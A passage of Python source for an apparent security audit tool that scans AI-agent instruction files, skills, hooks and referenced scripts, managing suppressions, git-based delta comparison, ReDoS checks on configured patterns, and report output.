    A broken file fails safe: returns an empty ignore set (suppresses nothing)."""
    path = root / "references" / "audit-ignore.json"
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return {"ignores": []}
    if isinstance(data, dict) and isinstance(data.get("ignores"), list):
        return data
    return {"ignores": []}


def _apply_ignores(
    findings: list[dict[str, Any]],
    ignore_doc: dict[str, Any],
    inline: dict[tuple[str, int], set[str]],
    root: str = ".",
) -> list[dict[str, Any]]:
    """Drop findings matched by a valid suppression. Fail-safe:
    - central entry missing non-empty reason -> NOT suppressed, append IGNORE002
    - central entry expired (expires < today) -> NOT suppressed, append IGNORE001
    - inline marker for a FLOOR rule -> NOT suppressed, append IGNORE003 (visibility)
    Paths normalized repo-relative on both sides."""
    floor = set(SEVERITY_FLOOR)
    today = utc_now()[:10]
    central: list[tuple[str, str, Any]] = []  # (rule_id, norm_path, line_or_None)
    extra: list[dict[str, Any]] = []
    for e in ignore_doc.get("ignores", []):
        if not isinstance(e, dict):
            continue  # fail-safe: a malformed (non-object) entry never suppresses or crashes
        rid, path = e.get("rule_id"), e.get("path")
        reason = str(e.get("reason", "")).strip()
        if not rid or not path:
            continue
        np = _norm_rel(str(path), root)
        if not reason:
            extra.append({"rule_id": "IGNORE002", "severity": "medium", "file": np, "line": 1,
                          "message": f"Suppression of {rid} has no reason — ignored.",
                          "suggestion": "Add a non-empty reason to references/audit-ignore.json."})
            continue
        exp = str(e.get("expires", "")).strip()
        if exp and (not _EXPIRES_RE.match(exp) or exp < today):
            extra.append({"rule_id": "IGNORE001", "severity": "medium", "file": np, "line": 1,
                          "message": f"Suppression of {rid} expired or has a bad date ({exp or 'n/a'}).",
                          "suggestion": "Renew with a valid future YYYY-MM-DD expires, or remove it."})
            continue
        central.append((rid, np, e.get("line")))

    kept: list[dict[str, Any]] = []
    for f in findings:
        fp = _norm_rel(str(f["file"]), root)
        rid = f["rule_id"]
        # central suppression (any rule)
        if any(rid == c_rid and fp == c_path and (c_line is None or c_line == f.get("line"))
               for c_rid, c_path, c_line in central):
            continue
        # inline suppression (advisory rules only)
        inline_ids = inline.get((fp, f.get("line")), set())
        if rid in inline_ids:
            if rid in floor:
                extra.append({"rule_id": "IGNORE003", "severity": "info", "file": fp, "line": f.get("line", 1),
                              "message": f"Inline sgt-ignore for floor rule {rid} ignored — use the central audit-ignore.json.",
                              "suggestion": "Floor-severity findings can only be suppressed via the CODEOWNERS-gated central file."})
                kept.append(f)
            # advisory rule: drop it (suppressed)
            continue
        kept.append(f)
    return kept + extra


def changed_files_from_git(base: str, root: str | Path = ".") -> set[str]:
    """Return repo-relative posix paths changed between `base` and HEAD.

    Uses three-dot diff so the comparison is against the merge-base of `base`
    and HEAD — the same set a merge request introduces over its target branch.
    """
    root_path = Path(root).expanduser().resolve()
    proc = subprocess.run(
        ["git", "-C", str(root_path), "diff", "--name-only", "--diff-filter=d", f"{base}...HEAD"],
        text=True,
        capture_output=True,
        check=False,
    )
    if proc.returncode != 0:
        raise ValueError(f"git diff against base '{base}' failed; verify the ref exists and the repo is fetched.")
    paths = {line.strip() for line in proc.stdout.splitlines() if line.strip()}
    # git emits paths relative to the REPO TOPLEVEL. When the audit root is a
    # subdirectory of the repo, map them to audit-root-relative (and drop paths
    # outside the root) — otherwise the scope intersection with discovered
    # assets is empty and a --changed-only gate goes silently green.
    top_proc = subprocess.run(
        ["git", "-C", str(root_path), "rev-parse", "--show-toplevel"],
        text=True, capture_output=True, check=False,
    )
    if top_proc.returncode == 0 and top_proc.stdout.strip():
        toplevel = Path(top_proc.stdout.strip()).resolve()
        if toplevel != root_path:
            try:
                prefix = root_path.relative_to(toplevel).as_posix() + "/"
            except ValueError:
                prefix = None
            if prefix:
                paths = {p[len(prefix):] for p in paths if p.startswith(prefix)}
    return paths


def finding_key(f: dict) -> tuple:
    """Stable identity for delta comparison. Line is excluded — it shifts when
    surrounding text changes — so a moved-but-identical finding is 'pre-existing'."""
    return (f.get("rule_id"), f.get("file"), f.get("message"))


def introduced_findings(base: list[dict], head: list[dict]) -> list[dict]:
    """HEAD findings whose key is absent from the base set."""
    base_keys = {finding_key(f) for f in base}
    return [f for f in head if finding_key(f) not in base_keys]


def _git_show(base: str, rel_path: str, root: Path) -> str | None:
    """Return the content of `rel_path` at ref `base`, or None if it cannot be
    read (path new on HEAD, deleted on base, or git error). Caller treats None
    as 'no base content' → the path's HEAD findings are all INTRODUCED."""
    proc = subprocess.run(
        ["git", "-C", str(root), "show", f"{base}:{rel_path}"],
        text=True,
        capture_output=True,
        check=False,
    )
    if proc.returncode != 0:
        return None
    return proc.stdout


def base_findings(
    base: str,
    root: Path,
    head_findings: list[dict[str, Any]],
    profile: str = "release-ready",
) -> list[dict[str, Any]]:
    """Reconstruct the base revision of every file that carries a HEAD finding,
    audit that base tree, and return its findings.

    Approach: for each distinct file path among `head_findings`, read its base
    blob via `git show <base>:<relpath>` into a temp tree mirroring the repo
    layout, then run audit_project over that tree. This is the simplest faithful
    reconstruction — the same engine, same rules, same paths.

    Fail-safe: a path whose base blob cannot be read (new file, git error) is
    simply absent from the temp tree, so it produces no base findings and its
    HEAD findings stay INTRODUCED (block). We never skip a finding on error.
    """
    import shutil

    rel_paths = sorted({str(f.get("file")) for f in head_findings if f.get("file")})
    if not rel_paths:
        return []

    tmp_root = Path(tempfile.mkdtemp(prefix="sgt-base-"))
    try:
        recovered: set[str] = set()
        for rel in rel_paths:
            # rel is repo-relative posix already (finding.file uses as_posix on a
            # path under root); normalize and guard against escaping the temp root.
            norm = _norm_rel(rel, str(root))
            dest = tmp_root / norm
            if not is_within_root(dest, tmp_root):
                continue
            content = _git_show(base, norm, root)
            if content is None:
                continue  # fail-safe: no base content → HEAD findings stay introduced
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_text(content, encoding="utf-8")
            recovered.add(norm)
        if not recovered:
            return []
        report = audit_project(tmp_root, profile=profile, changed_paths=recovered)
        base = report.get("findings") or []
        # Re-base each finding's file to repo-relative posix so its key lines up
        # with HEAD findings (which live under the real root, not the temp tree).
        for f in base:
            f["file"] = _norm_rel(str(f.get("file")), str(tmp_root))
        return base
    finally:
        shutil.rmtree(tmp_root, ignore_errors=True)


def tag_introduced(head_findings: list[dict[str, Any]], base: list[dict[str, Any]], root: Path) -> None:
    """Mutate `head_findings` in place, setting each `introduced` boolean by
    comparing repo-relative finding keys against the base set."""
    base_keys = {finding_key({**f, "file": _norm_rel(str(f.get("file")), str(root))}) for f in base}
    for f in head_findings:
        key = finding_key({**f, "file": _norm_rel(str(f.get("file")), str(root))})
        f["introduced"] = key not in base_keys


def _in_scope(relative_path: str, changed_paths: set[str] | None) -> bool:
    """Whole-repo audit when changed_paths is None; otherwise scope to the set."""
    return changed_paths is None or relative_path in changed_paths


def audit_project(
    root: str | Path = ".",
    profile: str = "release-ready",
    changed_paths: set[str] | None = None,
    include_install_dirs: bool = False,
) -> dict[str, Any]:
    root_path = Path(root).expanduser().resolve()
    discovery = discover_agent_assets(root_path, include_install_dirs=include_install_dirs)
    findings: list[Finding] = []
    skill_reports: list[dict[str, Any]] = []
    # Inline sgt-ignore markers, keyed by normalized rel path + line, collected
    # from every in-scope body we read below. Floor rules can never be silenced
    # through these (attacker-controlled file); _apply_ignores enforces that.
    inline: dict[tuple[str, int], set[str]] = {}

    instruction_assets = [a for a in discovery["assets"] if a["type"] == "instructions"]
    if len(instruction_assets) > 1:
        for asset in instruction_assets:
            if not _in_scope(asset["relative_path"], changed_paths):
                continue
            findings.append(
                finding("DISC001", Path(asset["path"]), 1, "Additional AGENTS.md instruction root detected.", "Confirm nested instruction scope is intentional and documented.")
            )

    for alias_name in ("CLAUDE.md", "GEMINI.md"):
        alias_path = root_path / alias_name
        if alias_path.exists() and _in_scope(rel_to(alias_path, root_path), changed_paths):
            text = read_text(alias_path)
            if "AGENTS.md" not in text:
                findings.append(
                    finding("DISC002", alias_path, 1, f"{alias_name} does not appear to import AGENTS.md.", "Keep runtime aliases as thin imports of AGENTS.md.")
                )

    copilot_path = root_path / ".github" / "copilot-instructions.md"
    if (
        copilot_path.exists()
        and _in_scope(rel_to(copilot_path, root_path), changed_paths)
        and "AGENTS.md" not in read_text(copilot_path)
    ):
        findings.append(
            finding("DISC002", copilot_path, 1, ".github/copilot-instructions.md does not appear to import AGENTS.md.", "Keep runtime aliases as thin imports of AGENTS.md.")
        )

    for asset in discovery["assets"]:
        if asset["type"] != "skill":
            continue
        if not _in_scope(asset["relative_path"], changed_paths):
            continue
        report = audit_skill(asset["path"], profile=profile, root=root_path)
        skill_reports.append(report)
        # audit_skill returns enriched dicts (title/rationale added); rebuild the
        # frozen Finding from only its own fields so the extra keys don't break it.
        findings.extend(Finding(**{k: f[k] for k in Finding.__dataclass_fields__}) for f in report["findings"])
        skill_text = safe_read_asset(Path(asset["path"]), root_path)
        if skill_text is not None:
            inline.update(_parse_inline_ignores(skill_text, _norm_rel(asset["path"], str(root_path))))

    # Scripts referenced by in-scope asset bodies whose content must be content-scanned
    # (SCR001-SCR003). Only skill/agent/command bodies carry meaningful script refs.
    referenced_scripts: set[str] = set()

    for asset in discovery["assets"]:
        if asset["type"] == "skill":
            continue
        if not _in_scope(asset["relative_path"], changed_paths):
            continue
        text = safe_read_asset(Path(asset["path"]), root_path)
        if text is None:
            continue
        inline.update(_parse_inline_ignores(text, _norm_rel(asset["path"], str(root_path))))
        if asset["type"] in ("agent", "command"):
            referenced_scripts |= _referenced_scripts_in_body(
                text, Path(asset["path"]).parent, root_path)
        # Hooks need structural JSON-walking, not just text scanning, so scan_hook
        # is special-cased here (it reads + parses on its own from path+root) rather
        # than routed through the text-only checks_for callables.
        if asset["type"] == "hook":
            findings.extend(scan_hook(Path(asset["path"]), root_path))
        # plugin.json stays type plugin-config, but a `hooks` block inside it carries
        # the same threat — scan it for hook commands in addition to the config checks.
        if asset["type"] == "plugin-config":
            findings.extend(scan_hook(Path(asset["path"]), root_path))
        for check in checks_for(asset["type"], root_path):
            findings.extend(check(text, Path(asset["path"])))

    # Collect script references from in-scope SKILL.md bodies too (skills are the
    # primary asset type that references helper scripts).
    for asset in discovery["assets"]:
        if asset["type"] != "skill":
            continue
        if not _in_scope(asset["relative_path"], changed_paths):
            continue
        skill_text = safe_read_asset(Path(asset["path"]), root_path)
        if skill_text is not None:
            referenced_scripts |= _referenced_scripts_in_body(
                skill_text, Path(asset["path"]).parent, root_path)

    # Transitive-bypass closure: also scan a CHANGED script even if it is referenced
    # only by an UNCHANGED asset (its own ref would otherwise be out of scope). The
    # closure is intersected with the FULL referenced-script set (across ALL assets,
    # ignoring scope): a changed script no asset references is not an agent attack
    # surface, and whole-tree mode never scans it — without this intersection a
    # standalone changed script (e.g. a test fixture with deliberate fake secrets)
    # would be flagged in changed-only but not whole-tree, a mode-dependent false
    # positive. SCR rules apply to REFERENCED scripts only (see checks-reference.md).
    scripts_to_scan: set[str] = set(referenced_scripts)
    if changed_paths is not None:
        all_referenced: set[str] = set()
        for asset in discovery["assets"]:
            if asset["type"] not in ("skill", "agent", "command"):
                continue
            body = safe_read_asset(Path(asset["path"]), root_path)
            if body is not None:
                all_referenced |= _referenced_scripts_in_body(
                    body, Path(asset["path"]).parent, root_path)
        changed_scripts = {
            p for p in changed_paths
            if re.search(r"(?:^|/)scripts/[A-Za-z0-9._-]+\.(?:py|sh|ps1)$", p)
        }
        scripts_to_scan |= (changed_scripts & all_referenced)

    for rel in sorted(scripts_to_scan):
        script_path = root_path / rel
        for f in scan_script_content(script_path, root_path):
            findings.append(f)

    ignore_doc = _load_ignore_doc(root_path)
    findings_dicts = enrich_findings(
        _apply_ignores([asdict(f) for f in findings], ignore_doc, inline, root=str(root_path))
    )

    return {
        "kind": "project-audit",
        "profile": profile,
        "generated_at": utc_now(),
        "engine_version": engine_version(),
        "rules_version": load_rule_catalog()["version"],
        "root": as_posix(root_path),
        "discovery": discovery,
        "summary": summarize_findings(findings_dicts),
        "findings": findings_dicts,
        "skill_reports": skill_reports,
    }


def summarize_findings(findings: list[Finding] | list[dict[str, Any]]) -> dict[str, Any]:
    counts = {"high": 0, "medium": 0, "low": 0, "info": 0}
    for item in findings:
        severity = item["severity"] if isinstance(item, dict) else item.severity
        counts[severity] = counts.get(severity, 0) + 1
    return {
        "total": len(findings),
        "by_severity": counts,
        "passed": len(findings) == 0,
    }


def should_fail(report: dict[str, Any], threshold: str) -> bool:
    if threshold == "none":
        return False
    findings = report.get("findings") or []
    if threshold == "any":
        return bool(findings)
    severity_rank = {"info": 0, "low": 1, "medium": 2, "high": 3}
    min_rank = severity_rank[threshold]
    return any(severity_rank.get(str(item.get("severity")), -1) >= min_rank for item in findings)


def explain_rule(rule_id: str) -> dict[str, Any]:
    rule = rules_by_id().get(rule_id)
    if rule is None:
        raise KeyError(f"Unknown rule id: {rule_id}")
    return dict(rule)


def explain_finding(rule_id: str) -> dict[str, Any]:
    """Build an author-facing, actionable explanation for one rule.

    Used by `explain-finding` so an MR author can act on a blocking finding from
    the comment alone — title/severity, how to fix, and the CORRECT suppression
    path. The suppression path branches on floor-ness: a severity-floor rule can
    ONLY be suppressed via the CODEOWNER-gated central file (the F3 invariant —
    inline markers must never suppress a floor rule), while an advisory rule
    accepts the inline marker.
    """
    rule = explain_rule(rule_id)  # raises KeyError on unknown id → handled by main
    is_floor = rule_id in SEVERITY_FLOOR
    if is_floor:
        suppression = {
            "kind": "central",
            "instructions": (
                f"Floor rule — inline markers cannot suppress it. Add a "
                f"CODEOWNER-approved entry to references/audit-ignore.json:"
            ),
            "example": (
                'add to "ignores": [ { "rule_id": "' + rule_id + '", '
                '"path": "<file>", "reason": "<why acceptable>", '
                '"expires": "YYYY-MM-DD" } ]'
            ),
        }
    else:
        suppression = {
            "kind": "inline",
            "instructions": "Advisory rule — suppress inline at the finding site:",
            "example": f"<!-- sgt-ignore: {rule_id} reason=... -->",
        }
    return {
        "kind": "explain-finding",
        "rule_id": rule_id,
        "title": rule.get("title", ""),
        "severity": rule.get("severity", ""),
        "how_to_fix": rule.get("description", "").strip()
        or "See the rule catalog (agent_audit.py explain-rule) for detail.",
        "is_floor": is_floor,
        "suppression": suppression,
    }


def render_explain_finding(data: dict[str, Any]) -> str:
    """Render an explain-finding dict as a short, copy-paste-friendly text block."""
    supp = data["suppression"]
    return "\n".join(
        [
            f"{data['rule_id']} — {data['title']} [{data['severity']}]",
            "",
            "How to fix:",
            f"  {data['how_to_fix']}",
            "",
            "How to suppress:",
            f"  {supp['instructions']}",
            f"    {supp['example']}",
        ]
    )


def rule_catalog() -> dict[str, Any]:
    catalog = load_rule_catalog()
    load_config()  # surface a malformed `config` block here, not only on the audit path
    return {
        "generated_at": utc_now(),
        "version": catalog["version"],
        "source": "references/agent-audit-rules.json",
        "rules": catalog["rules"],
    }


# Per-pattern wall-clock budget for the ReDoS check. A regex that stays under the
# 500-char length cap can still backtrack catastrophically; this caps any single
# adversarial match before it hangs a CI gate.
REDOS_BUDGET_SECONDS = 0.25

# Adversarial corpus: strings engineered to trigger exponential backtracking in
# nested-quantifier regexes ((a+)+, (a|a)*, etc.), plus a couple of benign controls.
_REDOS_CORPUS = (
    "a" * 64,
    "a" * 64 + "!",
    ("ab" * 40) + "!",
    "x" * 64 + " ",
    "normal benign input string",
    "https://example.com/path?q=1",
)


def _time_one_match(pattern: Any, corpus_string: str) -> float:
    """Run one `pattern.search(corpus_string)` and return its wall-clock seconds.

    On Unix we ALSO arm a SIGALRM hard-timeout so a truly-hung regex is interrupted
    rather than wedging the process; the perf_counter measure is the portable
    primary signal and the only mechanism on non-Unix (no setitimer). A pattern that
    hangs in pure Python cannot be interrupted without per-match signals — the length
    cap (MAX_PATTERN_LENGTH) plus this post-hoc timing covers the realistic footgun."""
    import signal
    import time

    have_alarm = hasattr(signal, "setitimer") and hasattr(signal, "SIGALRM")
    old_handler = None
    if have_alarm:
        def _raise_timeout(signum: int, frame: Any) -> None:
            raise TimeoutError("regex match exceeded the time budget")

        try:
            old_handler = signal.signal(signal.SIGALRM, _raise_timeout)
            # Arm slightly past the budget so perf_counter, not SIGALRM, is the
            # usual reporter; SIGALRM only fires on a genuine hang.
            signal.setitimer(signal.ITIMER_REAL, REDOS_BUDGET_SECONDS * 4)
        except (ValueError, OSError):
            have_alarm = False  # not in main thread, or platform refused — fall back

    start = time.perf_counter()
    try:
        pattern.search(corpus_string)
    except TimeoutError:
        return float("inf")
    finally:
        if have_alarm:
            try:
                signal.setitimer(signal.ITIMER_REAL, 0)
                if old_handler is not None:
                    signal.signal(signal.SIGALRM, old_handler)
            except (ValueError, OSError):
                pass
    return time.perf_counter() - start


def validate_config(config_path: str | None = None) -> dict[str, Any]:
    """Validate org audit-config patterns BEFORE they reach a prod CI gate.

    Compiles the merged config (plus an optional standalone `--config` file) and
    runs every dangerous/secret/env-exfil/hook-deny pattern against an adversarial
    corpus under a per-pattern wall-clock budget. Surfaces compile errors and
    catastrophic-backtracking patterns. Returns {issues, checked} for the caller."""
    issues: list[dict[str, str]] = []

    try:
        cfg = load_config()
    except ValueError as exc:
        # _compile_patterns raises ValueError on a bad regex / over-length pattern.
        return {"kind": "validate-config", "issues": [{"kind": "compile", "label": "<merged-config>", "message": str(exc)}], "checked": 0}

    pattern_groups = ("dangerous_patterns", "secret_patterns", "env_exfil_patterns", "hook_deny")
    compiled: list[tuple[str, Any]] = []
    for group in pattern_groups:
        for entry in cfg.get(group) or []:
            # Entries are (label, pattern) or (label, pattern, suggestion).
            compiled.append((str(entry[0]), entry[1]))

    if config_path:
        # Validate the standalone file's patterns too — compile errors surface here.
        try:
            data = json.loads(Path(config_path).read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError) as exc:
            issues.append({"kind": "compile", "label": config_path, "message": f"could not read config file: {exc}"})
            data = {}
        block = data.get("config") if isinstance(data, dict) and isinstance(data.get("config"), dict) else data
        patterns = (block or {}).get("patterns") or {} if isinstance(block, dict) else {}
        for key, with_sugg in (("dangerous", True), ("secrets", False), ("env_exfil", True)):
            try:
                for entry in _compile_patterns(patterns.get(key), with_suggestion=with_sugg):
                    compiled.append((str(entry[0]), entry[1]))
            except ValueError as exc:
                issues.append({"kind": "compile", "label": f"{config_path}:{key}", "message": str(exc)})

    checked = 0
    for label, pattern in compiled:
        checked += 1
        worst = 0.0
        for corpus_string in _REDOS_CORPUS:
            elapsed = _time_one_match(pattern, corpus_string)
            worst = max(worst, elapsed)
            if elapsed > REDOS_BUDGET_SECONDS:
                break
        if worst > REDOS_BUDGET_SECONDS:
            budget_repr = "timeout" if worst == float("inf") else f"{worst:.3f}s"
            issues.append({
                "kind": "redos",
                "label": label,
                "message": f"Pattern '{label}' exceeded the {REDOS_BUDGET_SECONDS}s match budget ({budget_repr}) — catastrophic backtracking risk.",
            })

    return {"kind": "validate-config", "issues": issues, "checked": checked}


def _days_remaining(expires: str, today: str) -> int | None:
    """Whole-day delta between an expires date (YYYY-MM-DD) and today.
    Returns None for a malformed date so callers can skip the window check."""
    if not _EXPIRES_RE.match(expires):
        return None
    from datetime import date

    try:
        exp = date.fromisoformat(expires)
        now = date.fromisoformat(today)
    except ValueError:
        return None
    return (exp - now).days


def collect_suppressions(root: str | Path = ".") -> list[dict[str, Any]]:
    """Enumerate every suppression: central audit-ignore.json entries plus inline
    <!-- sgt-ignore: RULEID --> markers across governed asset bodies under root.

    Each record: rule_id, path, source (central|inline), reason/expires (central
    only), days_remaining + expired (when a central expires date is present)."""
    root_path = Path(root).expanduser().resolve()
    today = utc_now()[:10]
    out: list[dict[str, Any]] = []

    # Central entries from references/audit-ignore.json.
    for e in _load_ignore_doc(root_path).get("ignores", []):
        if not isinstance(e, dict):
            continue
        rid, path = e.get("rule_id"), e.get("path")
        if not rid or not path:
            continue
        rec: dict[str, Any] = {
            "rule_id": str(rid),
            "path": _norm_rel(str(path), str(root_path)),
            "source": "central",
            "reason": str(e.get("reason", "")).strip(),
            "expires": str(e.get("expires", "")).strip() or None,
            "days_remaining": None,
            "expired": False,
        }
        if rec["expires"]:
            dr = _days_remaining(rec["expires"], today)
            rec["days_remaining"] = dr
            # A bad date or a past date both count as expired (fail-safe parity
            # with _apply_ignores, which refuses to honor either).
            rec["expired"] = dr is None or dr < 0
        out.append(rec)

    # Inline markers across discovered asset bodies.
    discovery = discover_agent_assets(root_path)
    for asset in discovery["assets"]:
        text = safe_read_asset(Path(asset["path"]), root_path)
        if text is None:
            continue
        rel = _norm_rel(asset["path"], str(root_path))
        for (_path, line), rule_ids in _parse_inline_ignores(text, rel).items():
            for rid in sorted(rule_ids):
                out.append({
                    "rule_id": rid,
                    "path": rel,
                    "line": line,
                    "source": "inline",
                    "reason": None,
                    "expires": None,
                    "days_remaining": None,
                    "expired": False,
                })
    return out


def list_suppressions_report(
    root: str | Path = ".", expiring_within: int | None = None
) -> dict[str, Any]:
    """Build the list-suppressions report. `blocked` is True when any entry is
    expired, or (with expiring_within) any entry expires within that many days."""
    suppressions = collect_suppressions(root)
    expired = [s for s in suppressions if s["expired"]]
    expiring: list[dict[str, Any]] = []
    if expiring_within is not None:
        expiring = [
            s for s in suppressions
            if not s["expired"]
            and s["days_remaining"] is not None
            and s["days_remaining"] <= expiring_within
        ]
    return {
        "kind": "list-suppressions",
        "generated_at": utc_now(),
        "root": as_posix(Path(root).expanduser().resolve()),
        "expiring_within": expiring_within,
        "suppressions": suppressions,
        "blocked": bool(expired or expiring),
    }


def print_list_suppressions(report: dict[str, Any]) -> None:
    sups = report.get("suppressions", [])
    print(f"Suppressions under {report.get('root')}: {len(sups)}")
    for s in sups:
        bits = [s["rule_id"], s["path"], f"source={s['source']}"]
        if s.get("expires"):
            tag = "EXPIRED" if s["expired"] else f"{s['days_remaining']}d left"
            bits.append(f"expires={s['expires']} ({tag})")
        if s.get("reason"):
            bits.append(f"reason={s['reason']}")
        print("  " + "  ".join(bits))


def findings_history_path(root: Path) -> Path:
    return root / "out" / "security" / "findings.jsonl"


def record_findings(root: Path, findings: list[dict[str, Any]], ts: str) -> None:
    """Append one JSON line per finding to out/security/findings.jsonl. Opt-in;
    creates the directory if missing. `ts` is stamped via utc_now() by the caller."""
    hist = findings_history_path(root)
    hist.parent.mkdir(parents=True, exist_ok=True)
    with hist.open("a", encoding="utf-8") as fh:
        for f in findings:
            rec: dict[str, Any] = {
                "ts": ts,
                "rule_id": f.get("rule_id"),
                "severity": f.get("severity"),
                "file": f.get("file"),
                "suppressed": False,
            }
            if "introduced" in f:
                rec["introduced"] = bool(f.get("introduced"))
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")


def report_trends(root: str | Path = ".") -> dict[str, Any]:
    """Summarize out/security/findings.jsonl: total events, top rules by count,
    severity breakdown, introduced count. Missing/empty file -> empty report."""
    root_path = Path(root).expanduser().resolve()
    hist = findings_history_path(root_path)
    events: list[dict[str, Any]] = []
    try:
        for line in hist.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                events.append(json.loads(line))
            except json.JSONDecodeError:
                continue  # tolerate a torn line from a concurrent append
    except OSError:
        events = []

    by_rule: dict[str, int] = {}
    by_severity: dict[str, int] = {}
    introduced = 0
    for e in events:
        rid = str(e.get("rule_id", ""))
        if rid:
            by_rule[rid] = by_rule.get(rid, 0) + 1
        sev = str(e.get("severity", ""))
        if sev:
            by_severity[sev] = by_severity.get(sev, 0) + 1
        if e.get("introduced"):
            introduced += 1

    top_rules = [
        {"rule_id": rid, "count": cnt}
        for rid, cnt in sorted(by_rule.items(), key=lambda kv: (-kv[1], kv[0]))
    ]
    return {
        "kind": "report-trends",
        "generated_at": utc_now(),
        "root": as_posix(root_path),
        "total": len(events),
        "top_rules": top_rules,
        "by_severity": by_severity,
        "introduced": introduced,
    }


def print_report_trends(report: dict[str, Any]) -> None:
    print(f"Findings history under {report.get('root')}: {report.get('total', 0)} event(s)")
    if report.get("introduced"):
        print(f"  introduced: {report['introduced']}")
    for sev, cnt in (report.get("by_severity") or {}).items():
        print(f"  {sev}: {cnt}")
    for r in report.get("top_rules", []):
        print(f"  {r['rule_id']}\t{r['count']}")


def print_text_report(report: dict[str, Any]) -> None:
    summary = report.get("summary", {})
    print(f"{report.get('kind', 'audit')} ({report.get('profile', 'default')})")
    print(f"Target: {report.get('target') or report.get('root')}")
    print(f"Findings: {summary.get('total', 0)}")
    for severity, count in (summary.get("by_severity") or {}).items():
        if count:
            print(f"  {severity}: {count}")
    by_rule = summary.get("by_rule")
    if by_rule:
        print("By rule:")
        for rule_id, count in sorted(by_rule.items(), key=lambda kv: (-kv[1], kv[0])):
            print(f"  {rule_id}: {count}")
    for item in report.get("findings", []):
        print("")
        title = item.get("title")
        header = f"[{item['severity'].upper()}] {item['rule_id']}"
        if title:
            header += f" — {title}"
        print(f"{header}   {item['file']}:{item['line']}")
        print(f"  {item['message']}")
        rationale = item.get("rationale")
        # Only add a "Why:" line when the rationale adds information beyond the
        # message itself — a rationale identical to the message would be noise.
        if rationale and rationale != item.get("message"):
            print(f"  Why: {rationale}")
        print(f"  Suggestion: {item['suggestion']}")


def print_github_annotations(report: dict[str, Any]) -> None:
    """Emit GitHub Actions workflow commands — one annotation per finding.

    `::error` for high severity; `::warning` for medium/low/info. Paths are
    rendered repo-relative to the audit root so they resolve in the PR diff view."""
    root = report.get("root") or report.get("target") or "."
    for item in report.get("findings", []):
        rel = _norm_rel(str(item.get("file", "")), str(root))
        level = "error" if str(item.get("severity")) == "high" else "warning"
        line = item.get("line", 1)
        rule_id = item.get("rule_id", "")
        # Strip newlines — a literal newline would terminate the workflow command early.
        message = str(item.get("message", "")).replace("\n", " ")
        # The annotation title carries the human-readable rule title after the id, so a
        # reviewer reading the PR annotation sees WHAT the rule is, not just the code.
        rule_title = str(item.get("title", "")).replace("\n", " ")
        title = f"{rule_id}: {rule_title}" if rule_title else rule_id
        print(f"::{level} file={rel},line={line},title={title}::{message}")


def emit(data: dict[str, Any], fmt: str) -> None:
    if fmt == "json":
        print(json.dumps(data, ensure_ascii=False, indent=2))
    elif fmt == "github":
        if data.get("kind") in {"project-audit", "skill-audit"}:
            print_github_annotations(data)
        else:
            print_text_report(data) if data.get("kind") else print(json.dumps(data, ensure_ascii=False, indent=2))
    else:
        if data.get("kind") in {"project-audit", "skill-audit"}:
            print_text_report(data)
        elif data.get("kind") == "list-suppressions":
            print_list_suppressions(data)
        elif data.get("kind") == "report-trends":
            print_report_trends(data)
        elif data.get("kind") == "explain-finding":
            print(render_explain_finding(data))
        elif data.get("kind") == "validate-config":
            issues = data.get("issues") or []
            print(f"validate-config: checked {data.get('checked', 0)} pattern(s)")
            if not issues:
                print("  OK — all patterns compile and stay within the ReDoS budget.")
            for issue in issues:
                print(f"  [{issue['kind']}] {issue['label']}: {issue['message']}")
        elif "assets" in data:
            print(f"Discovered {len(data['assets'])} agent asset(s) under {data['root']}")
            for asset in data["assets"]:
                print(f"{asset['type']}\t{asset['relative_path']}")
        elif "rules" in data:
            for rule in data["rules"]:
                print(f"{rule['rule_id']}\t{rule['severity']}\t{rule['title']}")
        else:
            print(json.dumps(data, ensure_ascii=False, indent=2))


def _kill_switch_active() -> bool:
    """`SGT_FAIL_MODE=advisory` is the fleet-wide kill-switch: it forces a
    non-blocking exit even when findings OR expired suppressions meet the blocking
    threshold. The audit still runs and reports; only the exit code is downgraded.
    Default (`enforce` or unset) keeps blocking behavior. Every blocking exit path
    (audit gates AND list-suppressions hygiene) routes through this so a single
    variable silences the whole fleet, as the security runbook promises."""
    if os.environ.get("SGT_FAIL_MODE", "enforce") == "advisory":
        print("SGT_FAIL_MODE=advisory: not blocking despite blocking findings/suppressions.",
              file=sys.stderr)
        return True
    return False


def _gate_exit_code(blocked: bool, blocked_code: int = 1) -> int:
    """Map a gate-block decision to an exit code, honoring the kill-switch.

    `blocked_code` is the non-advisory blocking exit: 1 for audit gates,
    2 for list-suppressions hygiene (which reserves 2 for "expired waiver")."""
    if not blocked:
        return 0
    return 0 if _kill_switch_active() else blocked_code


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Discover and audit agent-governance assets.")
    parser.add_argument("--format", choices=["text", "json", "github"], default="text")
    sub = parser.add_subparsers(dest="command", required=True)

    p_discover = sub.add_parser("discover", help="Discover agent assets in a project.")
    p_discover.add_argument("--format", choices=["text", "json"], default=argparse.SUPPRESS)
    p_discover.add_argument("root", nargs="?", default=".")

    p_project = sub.add_parser("audit-project", help="Audit all discovered skills and instruction aliases.")
    p_project.add_argument("--format", choices=["text", "json", "github"], default=argparse.SUPPRESS)
    p_project.add_argument("root", nargs="?", default=".")
    p_project.add_argument("--profile", choices=["security", "quality", "maintainability", "release-ready"], default="release-ready")
    p_project.add_argument("--fail-on", choices=["none", "high", "medium", "low", "info", "any"], default="none", help="Exit 1 when findings meet or exceed this severity (absolute, all findings).")
    p_project.add_argument("--fail-on-new", choices=["none", "high", "medium", "low", "info", "any"], default="none", help="Exit 1 only when findings INTRODUCED vs --base meet or exceed this severity. Requires --base.")
    p_project.add_argument("--changed-only", action="store_true", help="Audit only assets changed against --base (merge request scope).")
    p_project.add_argument("--base", default="origin/main", help="Git ref to diff against when --changed-only or --fail-on-new is set.")
    p_project.add_argument("--whole-tree", action="store_true", help="Impact-report mode: force a FULL audit (ignore --changed-only/delta), add a per-rule histogram, and never block (always exit 0).")
    p_project.add_argument("--record", action="store_true", help="Append one JSON line per finding to out/security/findings.jsonl under the audited root (opt-in observability).")
    p_project.add_argument("--include-install-dirs", action="store_true", help="Also audit per-host install directories (.claude/.codex/.gemini/.cursor). Excluded by default so a fresh install's copied assets don't manufacture findings.")

    p_suppress = sub.add_parser("list-suppressions", help="List central + inline suppressions and flag expired/expiring ones.")
